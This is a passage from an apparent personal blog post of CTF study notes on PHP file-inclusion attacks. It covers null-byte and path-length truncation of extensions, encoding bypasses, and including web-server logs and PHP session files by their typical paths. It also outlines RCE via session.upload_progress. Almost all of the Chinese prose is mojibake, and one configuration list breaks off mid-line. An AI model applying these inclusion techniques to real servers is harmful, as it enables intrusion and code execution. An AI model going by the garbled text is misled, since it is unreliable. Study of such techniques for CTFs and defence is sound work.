<p>%00æˆªæ–­-&gt;å¯¼è‡´æ‰©å±•åè¢«æˆªæ–­</p>
<blockquote>
<p>(1) magic_quotes_gpc&#x3D;off(2) PHP&lt;5.3.4<br>æ„é€ è¶…è¿‡æœ€å¤§é•¿åº¦é™åˆ¶payload-ç³»ç»Ÿä¼šå°†åé¢çš„è·¯å¾„ä¸¢å¼ƒï¼Œæ‰©å±•åè¢«æˆªæ–­<br>Windowsä¸‹ç›®å½•çš„æœ€å¤§è·¯å¾„256BLinuxä¸‹ç›®å½•çš„æœ€å¤§è·¯å¾„é•¿åº¦ä¸º4096B</p>
</blockquote>
<p>æ³¨æ„è¿™é‡Œè¦# æœ‰ç¼–ç é—®é¢˜æ—¶æ›¿æ¢æˆ#</p>
<h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><p>urlå¤šæ¬¡ç¼–ç <br>unicodeå½¢è¿‘å­—å‹ç»•è¿‡</p>
<h2 id="åˆ©ç”¨æ—¥å¿—æ–‡ä»¶"><a href="#åˆ©ç”¨æ—¥å¿—æ–‡ä»¶" class="headerlink" title="åˆ©ç”¨æ—¥å¿—æ–‡ä»¶"></a>åˆ©ç”¨æ—¥å¿—æ–‡ä»¶</h2><p>ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ä¼šå°†è¯·æ±‚å†™å…¥ <strong>access.log</strong></p>
<p>å‘ç”Ÿé”™è¯¯æ—¶å°†é”™è¯¯å†™å…¥ <strong>error.log</strong></p>
<p>ä¸€äº›å¸¸è§çš„æ—¥å¿—è·¯å¾„ï¼š</p>
<p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p>
<h2 id="åŒ…å«session"><a href="#åŒ…å«session" class="headerlink" title="åŒ…å«session"></a>åŒ…å«session</h2><p>phpçš„sessionæ–‡ä»¶ä¿å­˜è·¯å¾„å¯ä»¥åœ¨<strong>phpinfo</strong>ä¸­çš„session.save_pathçœ‹åˆ°ï¼Œè‹¥ä¸ºç©ºï¼Œè¯´æ˜åœ¨é»˜è®¤å­˜æ”¾ä½ç½®</p>
<p>å‘½åæ ¼å¼ï¼šsess_[PHPSESSID]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1./var/lib/php/sess_PHPSESSID</span><br><span class="line">(php5 or php 7 or php)</span><br><span class="line">2./tmp/sess_PHPSESSID</span><br><span class="line">3./tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹PHPSESSID</p>
<p>F12-Application-Cookies</p>
<p>ä¸€ä¸ªå°å‚è€ƒï¼Œå…ˆè®°å½•ä¸€äº›æœªæ¥å¯èƒ½å‡ºç°çš„è€ƒç‚¹</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">session</span><span class="string">.</span><span class="comment">save_path=&quot;&quot;</span>  --<span class="comment">è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„session</span><span class="string">.</span><span class="comment">save_handler=&quot;&quot;</span> --<span class="comment">è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)ï¼Œé»˜è®¤filesä»¥æ–‡ä»¶å­˜å‚¨session</span><span class="string">.</span><span class="comment">auto_start</span>  <span class="comment">boolen</span> --<span class="comment">æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯</span><span class="string">,</span><span class="comment">é»˜è®¤ä¸º0ä¸å¯åŠ¨session</span><span class="string">.</span><span class="comment">serialize_handler</span>  <span class="comment">string</span> --<span class="comment">å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/</span></span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/90879209">https://zhuanlan.zhihu.com/p/90879209</a></p>
<h3 id="åˆ©ç”¨sessionæ–‡ä»¶åŒ…å«æ¼æ´RCE"><a href="#åˆ©ç”¨sessionæ–‡ä»¶åŒ…å«æ¼æ´RCE" class="headerlink" title="åˆ©ç”¨sessionæ–‡ä»¶åŒ…å«æ¼æ´RCE"></a>åˆ©ç”¨sessionæ–‡ä»¶åŒ…å«æ¼æ´RCE</h3><blockquote>
<p>session.upload_progress.enabled </p>
<p>è‹¥ä¸åœ¨php.iniä¸­å°†å…¶ç½®ä¸ºOffï¼Œå°±ä¼šåœ¨ä¸Šä¼ è¿‡ç¨‹ä¸­ç”Ÿæˆä¸Šä¼ è¿›åº¦æ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥ä»phpinfoä¸­è·å–</p>
</blockquote>
<p>å½“sessionä¸­çš„å†…å®¹å¯ä»¥æ§åˆ¶ï¼ˆå¦‚ä¼ å‚å†…å®¹æ²¡è¢«è¿‡æ»¤ï¼Œä¼ å…¥çš„å€¼å­˜å‚¨åˆ°sessionä¸­ï¼‰ï¼Œå°±å¯ä»¥åˆ©ç”¨ä¼ å‚çš„è¿‡ç¨‹è·å–æ•æ„Ÿä¿¡æ¯æˆ–RCE</p>

  <p><a class="classtest-link" href="/tags/web/" rel="tag">web</a> â€” Jan 20, 2022</p>
  


          <div class="row mt-2">
  
    <div class="eight columns">
      <p id="madewith">Made with â¤ and
        <a class="footer-link icon" href="https://hexo.io" target="_blank" style="text-decoration: none;" rel="noreferrer" aria-label="Hexo.io">
        <svg class="hexo svg-hov" width="14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><title>Hexo.js</title><path d="M12 .007L1.57 6.056V18.05L12 23.995l10.43-6.049V5.952L12 .007zm4.798 17.105l-.939.521-.939-.521V12.94H9.08v4.172l-.94.521-.938-.521V6.89l.939-.521.939.521v4.172h5.84V6.89l.94-.521.938.521v10.222z"/></svg>
        </a>
        
    </div>

    <!-- Sepcial thanks to https://simpleicons.org/ for the icons -->
    <div class="four columns mb-3 posisi" >
      
      <a class="ml-0 footer-link icon" href="https://github.com/Noname0519" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="GitHub">
        <svg class="github svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
      </a>
      

      

      

      

    </div>
  
</div>

        </div>
      </div>

    </div>

  </div>
  <script src="/js/nanobar.min.js"></script>
  <script>
    var options = {
      classname: 'nanobar',
      id: 'myNanobar'
    };
    var nanobar = new Nanobar(options);
    nanobar.go(30);
    nanobar.go(76);
    nanobar.go(100);
  </script>

</body>

</html>
